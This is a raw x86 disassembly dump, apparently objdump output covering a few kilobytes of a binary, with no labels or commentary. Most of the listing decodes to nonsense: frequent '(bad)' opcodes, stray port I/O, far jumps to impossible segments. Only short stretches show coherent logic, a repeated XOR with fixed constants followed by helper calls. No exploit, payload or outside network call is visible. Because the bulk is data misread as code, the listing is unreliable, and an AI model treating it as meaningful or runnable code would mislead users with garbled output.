  4213bb:	(bad)  
  4213bc:	out    dx,al
  4213bd:	bound  ecx,QWORD PTR [ecx+0x70a02638]
  4213c3:	in     al,dx
  4213c4:	(bad)
  4213c7:	stos   BYTE PTR es:[edi],al
  4213c8:	shr    BYTE PTR [ebx+0x30bcc650],1
  4213ce:	jbe    0x4213b0
  4213d0:	or     ebx,DWORD PTR [esi]
  4213d2:	retf   
  4213d3:	sbb    BYTE PTR ds:0x2b522441,ah
  4213d9:	adc    edx,ebp
  4213db:	lods   al,BYTE PTR ds:[esi]
  4213dc:	jno    0x4213a7
  4213de:	or     ecx,edi
  4213e0:	in     eax,dx
  4213e1:	into   
  4213e2:	in     eax,0x3b
  4213e4:	push   0x4a1609f1
  4213e9:	mov    cl,0xa4
  4213eb:	xchg   edx,eax
  4213ec:	lods   al,BYTE PTR ds:[esi]
  4213ed:	cdq    
  4213ee:	jbe    0x4213f9
  4213f0:	mov    ecx,0x38bb6c84
  4213f5:	sbb    BYTE PTR fs:[eax+0x9e0fe99],0x8d
  4213fd:	shl    DWORD PTR [esi-0x49],0x51
  421401:	sub    eax,0x5417dada
  421406:	mov    ds:0x79a07564,al
  42140b:	or     al,ch
  42140d:	test   BYTE PTR [eax],al
  42140f:	fwait
  421410:	dec    edi
  421411:	adc    bh,dl
  421413:	pop    es
  421414:	(bad)  
  421415:	out    dx,al
  421416:	mov    cl,0xdb
  421418:	adc    ch,BYTE PTR [eax+0x10]
  42141b:	int    0xc7
  42141d:	call   0xaaacceb0
  421422:	xor    edx,0x9c2b8ae8
  421428:	mov    cl,0x3e
  42142a:	call   0x422394
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	aas    
  42147d:	cs rcr DWORD PTR es:[edi],1
  421481:	mov    ebx,0xc44abec0
  421486:	mov    esi,0x66b90ebe
  42148b:	fld    TBYTE PTR [eax-0x7e097bb2]
  421491:	jb     0x421482
  421493:	in     al,0xc1
  421495:	pop    esi
  421496:	(bad)  
  421497:	jnp    0x421508
  421499:	xchg   edx,ecx
  42149b:	pushf  
  42149c:	sbb    BYTE PTR [ebx+0x34],0xa6
  4214a0:	jmp    0xad1b:0x3e581b90
  4214a7:	adc    bl,al
  4214a9:	sbb    al,0x4a
  4214ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ac:	imul   edi,edx,0x7e
  4214af:	ror    ch,cl
  4214b1:	test   DWORD PTR [edi+0x63],0x8a237cc8
  4214b8:	loopne 0x421445
  4214ba:	cwde   
  4214bb:	sbb    esp,DWORD PTR [esi+0x1b]
  4214be:	nop
  4214bf:	repz xor BYTE PTR [edx],ch
  4214c2:	ds jmp 0xe14f:0xf82929c3
  4214ca:	mov    WORD PTR [esi],gs
  4214cc:	xchg   edx,eax
  4214cd:	pop    ss
  4214ce:	mov    dh,0xf3
  4214d0:	fbld   TBYTE PTR [ebx+0x38a96a12]
  4214d6:	shl    cl,0x97
  4214d9:	mov    DWORD PTR [edi+ebp*1],edx
  4214dc:	jp     0x4214f3
  4214de:	fcmovne st,st(5)
  4214e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214e1:	xlat   BYTE PTR ds:[ebx]
  4214e2:	add    eax,0x44918473
  4214e7:	outs   dx,DWORD PTR ds:[esi]
  4214e8:	inc    edi
  4214ea:	adc    dl,ah
  4214ec:	in     eax,dx
  4214ed:	mov    eax,ds:0xd5d72ba4
  4214f2:	in     al,0x37
  4214f4:	data16 mov WORD PTR gs:[edi+0x2d],?
  4214f9:	add    BYTE PTR [esp+ecx*2-0x5c00f21c],dh
  421500:	inc    eax
  421501:	push   ebp
  421502:	and    al,0x31
  421504:	push   ebp
  421505:	inc    esp
  421506:	sub    BYTE PTR [edx],bl
  421508:	je     0x4214c3
  42150a:	hlt    
  42150b:	add    BYTE PTR [eax+0xd],dl
  42150e:	call   0xa37e189e
  421513:	xchg   DWORD PTR [ebx],edx
  421515:	dec    ebp
  421516:	inc    ebp
  421517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421518:	xchg   esp,eax
  421519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42151a:	mov    bh,0x87
  42151c:	xchg   ebp,eax
  42151d:	les    esp,FWORD PTR [ebx-0x44]
  421520:	xchg   ebp,eax
  421521:	adc    ch,BYTE PTR ss:[esp+edi*4]
  421525:	int3   
  421526:	in     al,0x8c
  421528:	inc    edx
  421529:	or     cl,cl
  42152b:	loopne 0x4214d7
  42152d:	xor    cl,dh
  42152f:	lds    eax,FWORD PTR [ecx+ebx*1+0x741bf900]
  421536:	pop    eax
  421537:	sti    
  421538:	sti    
  421539:	sbb    eax,0x94caaadd
  42153e:	fmul   st,st(2)
  421540:	jmp    0x9303507a
  421545:	cdq    
  421546:	mov    cl,0x44
  421548:	loope  0x4214df
  42154a:	call   DWORD PTR [eax+esi*4-0x1f0d74a2]
  421551:	inc    edx
  421552:	(bad)  
  421553:	(bad)  
  421554:	cmc    
  421555:	test   DWORD PTR [eax+0x7b],0x76aa1fd0
  42155c:	popf   
  42155d:	ins    DWORD PTR es:[edi],dx
  42155e:	sub    esp,0xffffffcb
  421561:	dec    ebx
  421562:	loope  0x421575
  421564:	push   esi
  421565:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  421567:	ficomp WORD PTR [edi+0x2a]
  42156a:	test   BYTE PTR [ebp+0x25],ah
  42156d:	xor    DWORD PTR [esi-0x5a],ecx
  421570:	outs   dx,BYTE PTR ds:[esi]
  421571:	mov    ebp,0xe36ef0fa
  421576:	fistp  WORD PTR [eax]
  421578:	mov    cl,0x4a
  42157a:	lds    ebp,FWORD PTR ds:0x22ce930e
  421580:	pop    ds
  421581:	inc    edx
  421583:	or     DWORD PTR [edx+ecx*2],edi
  421586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421587:	jnp    0x42152a
  421589:	fwait
  42158a:	addr16 sbb eax,0xc8db0aeb
  421590:	cmp    edx,ebx
  421592:	out    0x2,al
  421594:	push   eax
  421595:	push   ecx
  421596:	mov    eax,ds:0xfc03227a
  42159b:	push   ebx
  42159c:	repnz adc DWORD PTR [edi],edi
  42159f:	or     ebx,DWORD PTR [eax+edx*4]
  4215a2:	mov    esp,0x17cc07a
  4215a7:	aaa    
  4215a8:	jne    0x421557
  4215aa:	ret    0xb1d5
  4215ad:	retf   
  4215ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215af:	mov    esi,0x7e6c66a8
  4215b4:	jl     0x4215bd
  4215b6:	sbb    BYTE PTR [esi+0x6733cf8a],al
  4215bc:	shr    BYTE PTR [ebx],0x2e
  4215bf:	adc    al,0x6b
  4215c1:	fimul  DWORD PTR [edi-0x6dffd224]
  4215c7:	xor    al,0x3
  4215c9:	pop    es
  4215ca:	das    
  4215cb:	cmp    ecx,esi
  4215cd:	or     ebp,DWORD PTR [eax+0x2f]
  4215d0:	std    
  4215d1:	mov    ds:0xd8cee2c7,al
  4215d6:	push   ds
  4215d7:	lods   eax,DWORD PTR ds:[esi]
  4215d8:	nop
  4215d9:	popf   
  4215da:	outs   dx,DWORD PTR ds:[esi]
  4215db:	sar    edx,cl
  4215dd:	repz pop es
  4215df:	mov    ch,0x1
  4215e1:	repz scas al,BYTE PTR es:[edi]
  4215e3:	(bad)  
  4215e4:	scas   eax,DWORD PTR es:[edi]
  4215e5:	xchg   ecx,eax
  4215e6:	outs   dx,BYTE PTR ds:[esi]
  4215e7:	call   0xd454:0xde39a4bf
  4215ee:	mov    BYTE PTR [edx-0x6f],ah
  4215f1:	push   0x2d
  4215f3:	sbb    BYTE PTR [ecx-0x2c],cl
  4215f6:	inc    esi
  4215f7:	dec    edx
  4215f8:	mov    ebx,0x4236be1a
  4215fd:	int    0xb8
  4215ff:	xor    eax,0x1a0534fd
  421604:	mov    bl,0xe1
  421606:	dec    ebx
  421607:	xor    cl,BYTE PTR [ebx-0x5cd574f1]
  42160d:	or     BYTE PTR [eax],dl
  42160f:	adc    cl,BYTE PTR [eax-0x27]
  421612:	test   BYTE PTR [ecx],bh
  421614:	xchg   esp,eax
  421615:	test   al,0xf9
  421617:	inc    ecx
  421618:	out    0x52,eax
  42161a:	xchg   DWORD PTR [edx+eax*4+0xa4a9bec],ebp
  421621:	dec    edi
  421622:	icebp  
  421623:	iret   
  421624:	mov    eax,0xbe572471
  421629:	add    al,0x4d
  42162b:	shl    DWORD PTR [ecx-0x69],1
  42162e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42162f:	mov    ecx,0xfe4d5596
  421634:	mov    ecx,ds
  421636:	or     BYTE PTR [esi+0x1b],cl
  421639:	add    DWORD PTR [edi+ebp*8-0x8],0x657412f4
  421641:	push   ebx
  421642:	in     eax,dx
  421643:	sbb    DWORD PTR [eax-0x11874404],edx
  421649:	dec    edi
  42164a:	or     eax,0x1e7720cb
  42164f:	jb     0x4216b0
  421651:	(bad)  
  421652:	mov    eax,0xa2eaeadf
  421657:	pop    eax
  421658:	adc    esp,DWORD PTR [ebx-0x3218ed51]
  42165e:	int    0xb7
  421660:	inc    esp
  421661:	sub    BYTE PTR [edi],cl
  421663:	push   ebx
  421664:	jae    0x4216d9
  421666:	mov    eax,0x25a4fd76
  42166b:	ret    
  42166c:	xchg   ebx,eax
  42166d:	push   ds
  42166e:	sub    edi,DWORD PTR [edi-0x1c4b7b62]
  421674:	(bad)  
  421675:	aaa    
  421676:	pop    esi
  421677:	shl    dl,cl
  421679:	popa   
  42167a:	inc    edx
  42167b:	inc    eax
  42167c:	jle    0x4216a8
  42167e:	(bad)  
  42167f:	(bad)  [esi+0x29]
  421682:	retf   0x78c8
  421685:	aad    0x2c
  421687:	aas    
  421688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421689:	pop    edx
  42168a:	fadd   DWORD PTR [edx+0x7bcd30f9]
  421690:	dec    edi
  421691:	push   ebp
  421692:	jnp    0x4216ed
  421694:	mov    DWORD PTR [eax],esi
  421696:	adc    DWORD PTR [edi-0x1a],ebx
  421699:	ficomp WORD PTR [ecx-0x45]
  42169c:	push   ss
  42169d:	inc    ebx
  42169e:	(bad)  
  42169f:	scas   eax,DWORD PTR es:[edi]
  4216a0:	dec    eax
  4216a1:	and    BYTE PTR [edx-0x59],cl
  4216a4:	int3   
  4216a5:	jge    0x421672
  4216a7:	fdivr  QWORD PTR ds:0x7ecf7ee
  4216ad:	xlat   BYTE PTR ds:[ebx]
  4216ae:	sbb    dh,al
  4216b0:	jae    0x4216d2
  4216b2:	jp     0x4216bc
  4216b4:	push   ebx
  4216b5:	sub    ebx,0x41b4878b
  4216bb:	push   edx
  4216bc:	loop   0x421645
  4216be:	leave  
  4216bf:	xchg   edx,eax
  4216c0:	xchg   esi,eax
  4216c1:	int    0x5f
  4216c3:	stos   DWORD PTR es:[edi],eax
  4216c4:	test   BYTE PTR [ebx-0x4a70fe51],bl
  4216ca:	jl     0x4216e1
  4216cc:	lock add ch,BYTE PTR [ecx]
  4216cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216d0:	inc    esp
  4216d1:	ins    BYTE PTR es:[edi],dx
  4216d2:	cmp    BYTE PTR [eax],0xaa
  4216d5:	sbb    al,0x5a
  4216d7:	leave  
  4216d8:	xor    bl,dl
  4216da:	mov    eax,ds:0x5559a3cc
  4216df:	mov    edx,0x1d445385
  4216e4:	pop    edx
  4216e5:	in     eax,dx
  4216e6:	mov    ecx,0x4cdf903b
  4216eb:	and    eax,0x3f53b4e
  4216f0:	xchg   edi,eax
  4216f1:	add    ecx,DWORD PTR [eax+0x11]
  4216f4:	inc    edi
  4216f5:	dec    eax
  4216f6:	repz clc 
  4216f8:	adc    BYTE PTR [edx],bh
  4216fa:	cdq    
  4216fb:	mov    ecx,0x5c8db580
  421700:	push   ebp
  421701:	push   eax
  421702:	outs   dx,BYTE PTR es:[esi]
  421704:	pop    ecx
  421705:	outs   dx,DWORD PTR ds:[esi]
  421706:	in     al,0x31
  421708:	jle    0x4216ec
  42170a:	sbb    ecx,edi
  42170c:	rol    DWORD PTR [ebp+0x484dbfda],cl
  421712:	daa    
  421713:	and    al,bh
  421715:	mov    ebx,0x65c67417
  42171a:	fistp  DWORD PTR [esi]
  42171c:	mov    eax,ds:0xd3380420
  421721:	sub    ecx,edi
  421723:	sbb    eax,0xf153634b
  421728:	jmp    0x9e56:0xe7a12021
  42172f:	inc    ebp
  421730:	cld    
  421731:	pop    esp
  421732:	dec    ebp
  421733:	jns    0x421743
  421735:	inc    esi
  421736:	xor    eax,0xbfb9049e
  42173b:	gs mov edi,0xf8b1861f
  421741:	mov    DWORD PTR [edi+0x1b],ecx
  421744:	and    BYTE PTR [edi+0x48631549],0xdc
  42174b:	inc    ebx
  42174c:	cmp    eax,0x57980b9f
  421751:	dec    edx
  421752:	mov    eax,ds:0xc7d26b34
  421757:	cmc    
  421758:	sub    ah,0x34
  42175b:	mov    fs,WORD PTR [eax]
  42175d:	mov    DWORD PTR [esi+0x77],0xe7cf7d7d
  421764:	add    DWORD PTR [edi],ecx
  421766:	(bad)  
  421767:	fucomip st,st(6)
  421769:	add    bh,BYTE PTR [ebx]
  42176b:	sbb    BYTE PTR [esp+esi*8-0x75cdb768],ch
  421772:	cmp    BYTE PTR [edi+edx*2-0x6064a3c3],cl
  421779:	xchg   ebx,eax
  42177a:	sti    
  42177b:	mov    esp,0x1f4cdbc8
  421780:	int    0x2d
  421782:	cmp    ebp,edi
  421784:	pop    ebx
  421785:	adc    BYTE PTR [eax],ah
  421787:	push   ebx
  421788:	sbb    ch,BYTE PTR [esi]
  42178a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42178b:	imul   ch
  42178d:	retf   0x94ed
  421790:	inc    edx
  421791:	mov    ch,BYTE PTR [esi]
  421793:	js     0x421752
  421795:	pushf  
  421796:	jne    0x421731
  421798:	mov    ebx,?
  42179a:	and    al,0xa5
  42179c:	ror    edx,0xbd
  42179f:	jg     0x421791
  4217a1:	inc    ebx
  4217a2:	mov    cl,BYTE PTR [edx]
  4217a4:	dec    eax
  4217a5:	test   eax,0x8e1f0d46
  4217aa:	push   edx
  4217ab:	int    0xf4
  4217ad:	lds    esi,FWORD PTR [ebp-0x880695]
  4217b3:	jmp    0x5ec5c04a
  4217b8:	xchg   edx,eax
  4217b9:	push   es
  4217ba:	or     DWORD PTR [esi],ebx
  4217bc:	ins    DWORD PTR es:[edi],dx
  4217bd:	mov    edi,0xbd6b9846
  4217c2:	mov    edi,0xb489b526
  4217c7:	sbb    ebx,esi
  4217c9:	cli    
  4217ca:	and    DWORD PTR [edi-0x66],0x40048b51
  4217d1:	mov    cl,0x74
  4217d3:	dec    edi
  4217d4:	retf   
  4217d5:	aaa    
  4217d6:	inc    ebx
  4217d7:	and    bh,BYTE PTR [ecx]
  4217d9:	pushf  
  4217da:	push   edi
  4217db:	cmp    eax,0x75effd78
  4217e0:	fwait
  4217e1:	add    ebp,DWORD PTR [edi]
  4217e3:	shl    BYTE PTR [edx+0x3b],cl
  4217e6:	xchg   edi,eax
  4217e7:	(bad)  
  4217e8:	adc    eax,0xba991b84
  4217ed:	pop    esp
  4217ee:	jno    0x4217a7
  4217f0:	push   0x29d9763a
  4217f5:	js     0x4217bd
  4217f7:	into   
  4217f8:	cmp    edi,DWORD PTR [edi]
  4217fa:	repz (bad) 
  4217fc:	jp     0x421839
  4217fe:	out    0x28,eax
  421800:	(bad)  
  421801:	data16 aaa 
  421803:	and    DWORD PTR [edx-0x66],ecx
  421806:	imul   ebp,DWORD PTR [ecx+edi*1],0x6fa5a94d
  42180d:	into   
  42180e:	lahf   
  42180f:	fst    DWORD PTR [ebp+0x6c1e28ac]
  421815:	mov    BYTE PTR [edx+0x2146d142],dh
  42181b:	jp     0x421843
  42181d:	xchg   ebx,eax
  42181e:	out    dx,al
  42181f:	mov    bl,0x41
  421821:	push   esi
  421822:	bnd jae 0x42189a
  421825:	inc    edx
  421826:	xor    ecx,DWORD PTR [edi]
  421828:	add    al,0xa2
  42182a:	leave  
  42182b:	inc    edi
  42182c:	mov    eax,0xd451dfef
  421831:	into   
  421832:	jl     0x42186d
  421834:	pop    edx
  421835:	push   0xd
  421837:	sar    DWORD PTR [ecx-0x2e124ab1],1
  42183d:	xchg   ebx,eax
  42183e:	neg    DWORD PTR [esi-0x311fdb41]
  421844:	and    BYTE PTR [edi+0x1f],bl
  421847:	push   ss
  421848:	push   0x14bb88ae
  42184d:	gs pop dx
  421850:	sub    eax,DWORD PTR [edi]
  421852:	mov    edx,DWORD PTR [ebp-0x1ec]
  421858:	xor    eax,0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x422394
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x422394
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	aam    0xfd
  4218d0:	cli    
  4218d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218d2:	lods   al,BYTE PTR ds:[esi]
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi-0x46044042]
  4218dd:	xchg   ebx,eax
  4218de:	inc    esp
  4218df:	sbb    al,0xa3
  4218e1:	pop    ss
  4218e2:	sub    ebp,DWORD PTR [ecx+0x7627c18c]
  4218e8:	ret    0x8149
  4218eb:	loope  0x421880
  4218ed:	lods   eax,DWORD PTR ds:[esi]
  4218ee:	fmul   QWORD PTR [eax+0x5fe5eae4]
  4218f4:	add    eax,0xa8f69f09
  4218f9:	xchg   ebp,eax
  4218fa:	mov    eax,ds:0x50161bfd
  4218ff:	inc    ebp
  421900:	pop    ss
  421901:	inc    ecx
  421902:	jo     0x4218b1
  421904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421906:	ds std 
  421908:	cmp    ch,BYTE PTR [eax+0xf91e7b5]
  42190e:	pop    ebx
  42190f:	adc    DWORD PTR [edx-0x3c],ebx
  421912:	pop    ecx
  421913:	inc    ebx
  421914:	and    al,0x11
  421916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421917:	loope  0x42198c
  421919:	aam    0x97
  42191b:	add    ebp,DWORD PTR [eax+edi*2]
  42191e:	std    
  42191f:	mov    dl,0xfd
  421921:	mov    al,ds:0x1772bb41
  421926:	outs   dx,DWORD PTR ds:[esi]
  421927:	mov    eax,DWORD PTR [eax+0x7375b600]
  42192d:	jmp    0xb1d7:0x12a8efee
  421934:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  421936:	jg     0x4219b2
  421938:	add    ah,bl
  42193a:	add    DWORD PTR [edx],edi
  42193c:	(bad)  
  42193e:	aas    
  42193f:	outs   dx,DWORD PTR ds:[esi]
  421940:	cmc    
  421941:	lahf   
  421942:	or     DWORD PTR [ebp+0xe],ebp
  421945:	imul   edi,ecx,0xffffff8a
  421948:	sbb    dl,BYTE PTR [eax-0x50]
  42194b:	and    DWORD PTR [eax+0x46],ecx
  42194e:	dec    edx
  42194f:	in     eax,dx
  421950:	mov    ss,edx
  421952:	and    ebp,0x1d32e6bf
  421958:	js     0x421911
  42195a:	mov    bh,0x8f
  42195c:	or     ah,BYTE PTR ds:0x32390f55
  421962:	popa   
  421963:	or     al,0x83
  421965:	bound  edx,QWORD PTR [ecx]
  421967:	mov    ds:0xbcd8202f,al
  42196c:	jp     0x4219cd
  42196e:	mov    cl,0x14
  421970:	mov    dh,0xd3
  421972:	jmp    0xb6bd:0x39297802
  421979:	test   al,0xca
  42197b:	shr    DWORD PTR [edx-0x6b4c7b28],1
  421981:	out    dx,eax
  421982:	aad    0x2
  421984:	inc    ebx
  421985:	pop    esp
  421986:	imul   esi,DWORD PTR [esi+0x2d20f4e3],0xffffffa9
  42198d:	adc    dl,BYTE PTR [edi+eax*4+0x7b2d378d]
  421994:	xlat   BYTE PTR ds:[ebx]
  421995:	lahf   
  421996:	leave  
  421997:	mov    al,ds:0xfb4966e6
  42199c:	jmp    0x421a08
  42199e:	inc    esp
  42199f:	iret   
  4219a0:	fwait
  4219a1:	aaa    
  4219a2:	pop    es
  4219a3:	cmp    edx,ebx
  4219a5:	push   esi
  4219a6:	adc    eax,0xe2a7a018
  4219ab:	sub    eax,0xc40bf98c
  4219b0:	stos   DWORD PTR es:[edi],eax
  4219b1:	push   ecx
  4219b2:	shl    BYTE PTR [ebp-0x61],cl
  4219b5:	js     0x4219fe
  4219b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219b8:	add    BYTE PTR [edi-0x66ef3d82],0xf0
  4219bf:	push   cs
  4219c0:	out    dx,eax
  4219c1:	int3   
  4219c2:	xchg   edi,eax
  4219c3:	mov    fs,esi
  4219c5:	fld    QWORD PTR [edx+0x37924d57]
  4219cb:	mov    DWORD PTR [ebx],ebx
  4219cd:	dec    edi
  4219ce:	neg    DWORD PTR [edx+0x3e]
  4219d1:	pop    ebp
  4219d2:	jae    0x421a30
  4219d4:	std    
  4219d5:	sbb    DWORD PTR [ebx+0x41e4d74f],ecx
  4219db:	pop    ebx
  4219dc:	push   0x58d8a191
  4219e1:	cdq    
  4219e2:	mov    eax,ds:0x403e4b66
  4219e7:	lods   al,BYTE PTR fs:[esi]
  4219e9:	mov    ah,0xcb
  4219eb:	adc    al,0xd7
  4219ed:	jns    0x421a42
  4219ef:	fist   WORD PTR [eax+eax*8+0x3bba3f10]
  4219f6:	and    esi,DWORD PTR [edx]
  4219f8:	ficomp DWORD PTR [edx]
  4219fa:	mov    edx,0x52a3f3e2
  4219ff:	jecxz  0x421a05
  421a01:	mov    ebx,0x5f5753f0
  421a06:	in     eax,dx
  421a07:	push   ecx
  421a08:	jnp    0x421a0c
  421a0a:	in     eax,dx
  421a0b:	sar    DWORD PTR [edi],cl
  421a0d:	jnp    0x4219b7
  421a0f:	pop    ecx
  421a10:	or     al,0x4e
  421a12:	and    DWORD PTR [ecx],edx
  421a14:	(bad)  
  421a15:	cld    
  421a16:	mov    al,0x10
  421a18:	mov    esp,0xb2438c8
  421a1d:	cmp    ebp,DWORD PTR [esi-0x7b]
  421a20:	and    eax,0x8a0de9a7
  421a25:	sahf   
  421a26:	xchg   edx,eax
  421a27:	xor    BYTE PTR [edi],dl
  421a29:	add    edx,DWORD PTR [ebx+0x50947a99]
  421a2f:	push   ecx
  421a30:	cmp    al,0x74
  421a32:	arpl   WORD PTR [eax-0x53],sp
  421a35:	mov    bl,0x8d
  421a37:	shl    BYTE PTR [eax-0x3a1b16e8],cl
  421a3d:	jno    0x421a00
  421a3f:	sbb    DWORD PTR [edi-0x5c],esi
  421a42:	dec    ebx
  421a43:	aam    0xa5
  421a45:	lods   eax,DWORD PTR ds:[esi]
  421a46:	mov    esp,0x2a77a7e4
  421a4b:	enter  0xf515,0xd2
  421a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a50:	jmp    0x421abb
  421a52:	and    ch,al
  421a54:	cmp    DWORD PTR [ebp-0x1c],0x2ccb1e45
  421a5b:	sbb    BYTE PTR [esi-0x30e36c78],bh
  421a61:	jmp    0x7fed04ec
  421a66:	fistp  DWORD PTR [ecx-0x80]
  421a69:	ins    DWORD PTR es:[edi],dx
  421a6a:	retf   0xd47f
  421a6d:	jno    0x421a69
  421a6f:	mov    al,0xe1
  421a71:	lods   eax,DWORD PTR ds:[esi]
  421a72:	lods   eax,DWORD PTR ds:[esi]
  421a73:	jecxz  0x421a16
  421a75:	mov    eax,0x75707db1
  421a7a:	adc    eax,0x50f30991
  421a7f:	mov    al,0x1
  421a81:	or     eax,0x87b23b48
  421a86:	cmp    al,BYTE PTR [esi+esi*2-0x1b2df5ba]
  421a8d:	dec    esp
  421a8e:	dec    ecx
  421a8f:	inc    esi
  421a90:	lods   al,BYTE PTR ds:[esi]
  421a91:	xchg   ecx,eax
  421a92:	in     al,dx
  421a93:	mov    eax,fs:0xe382a817
  421a99:	popf   
  421a9a:	inc    eax
  421a9b:	pop    ss
  421a9c:	fild   WORD PTR [ecx]
  421a9e:	popa   
  421a9f:	mov    ebx,0xcbdda955
  421aa4:	mov    al,ds:0x685fa5aa
  421aa9:	jge    0x421abc
  421aab:	dec    esp
  421aac:	mov    DWORD PTR [eax-0x1],esi
  421aaf:	mov    dl,0x68
  421ab1:	and    esi,DWORD PTR [esi+edi*4]
  421ab4:	push   ds
  421ab5:	jmp    0xfc3bdf36
  421aba:	mov    cl,BYTE PTR [ecx-0x32]
  421abd:	xchg   edi,eax
  421abe:	push   esp
  421abf:	cmp    al,0x4e
  421ac1:	aaa    
  421ac2:	fbstp  TBYTE PTR [edi]
  421ac4:	mov    esp,DWORD PTR [ebp+0x7e]
  421ac7:	adc    DWORD PTR [ecx+edi*1+0x5aeef7e9],edi
  421ace:	or     ebp,DWORD PTR ds:0x398c376e
  421ad4:	lods   eax,DWORD PTR ds:[esi]
  421ad5:	mov    dl,BYTE PTR [ebp+0x2853019a]
  421adb:	sbb    al,0x16
  421add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ade:	fdivr  st(3),st
  421ae0:	jg     0x421b10
  421ae2:	call   0x1bb9:0x71de6b3e
  421ae9:	repz es loope 0x421b1c
  421aed:	sar    BYTE PTR [edi-0x51dc7267],1
  421af3:	(bad)  
  421af4:	xor    al,0x3e
  421af6:	inc    edx
  421af7:	adc    esi,DWORD PTR [edx-0x50]
  421afa:	add    eax,ecx
  421afc:	or     eax,0x4b8bd5a8
  421b01:	ss leave 
  421b03:	cdq    
  421b04:	pop    ebx
  421b05:	xor    eax,0x95076307
  421b0a:	jmp    0x421ad3
  421b0c:	jno    0x421b6f
  421b0e:	sbb    DWORD PTR [ebp-0x70],edi
  421b11:	(bad)
  421b15:	jo     0x421b23
  421b17:	jnp    0x421afd
  421b19:	cmp    BYTE PTR [eax+eax*8],bl
  421b1c:	test   DWORD PTR [esi],ecx
  421b1e:	sbb    dh,dh
  421b20:	push   ebp
  421b21:	icebp  
  421b22:	dec    edx
  421b23:	add    al,0xf9
  421b25:	aas    
  421b26:	dec    esi
  421b27:	jg     0x421b74
  421b29:	fadd   QWORD PTR [eax]
  421b2b:	in     al,0x82
  421b2d:	aam    0x56
  421b2f:	or     DWORD PTR [edi],eax
  421b31:	pop    ebp
  421b32:	scas   eax,DWORD PTR es:[edi]
  421b33:	mov    esi,0x7653e0f4
  421b38:	or     al,0xa4
  421b3a:	push   0xe1864274
  421b3f:	out    0xde,eax
  421b41:	xchg   ecx,eax
  421b42:	bound  ebp,QWORD PTR [ebx]
  421b44:	jb     0x421b00
  421b46:	cdq    
  421b47:	lds    esi,FWORD PTR [edx-0x20]
  421b4a:	loope  0x421b46
  421b4c:	cmp    eax,0x34d73aee
  421b51:	aad    0xcd
  421b53:	dec    ecx
  421b54:	lahf   
  421b55:	stos   DWORD PTR es:[edi],eax
  421b56:	out    0x39,al
  421b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b59:	lds    edi,FWORD PTR [edx+0x40c4557]
  421b5f:	pop    edx
  421b60:	bound  ecx,QWORD PTR [edi-0x4952a96d]
  421b66:	je     0x421b2d
  421b68:	mov    ebp,0xda805283
  421b6d:	mov    bh,0x8c
  421b6f:	cmp    edi,DWORD PTR [eax]
  421b71:	ss aam 0x3f
  421b74:	rcl    DWORD PTR [ebp-0x37],cl
  421b77:	adc    BYTE PTR [eax-0x6e],ch
  421b7a:	add    DWORD PTR [esi+0x23],esp
  421b7d:	mov    al,ds:0x3b710556
  421b82:	in     al,dx
  421b83:	xchg   esi,eax
  421b84:	pop    esp
  421b85:	inc    edi
  421b86:	push   ss
  421b87:	gs and eax,0xf6b21122
  421b8d:	xor    edi,DWORD PTR ds:0xe08970b1
  421b93:	outs   dx,DWORD PTR ds:[esi]
  421b94:	cli    
  421b95:	fdiv   QWORD PTR [edi]
  421b97:	jae    0x421c05
  421b99:	jmp    FWORD PTR [edx-0x7469d71c]
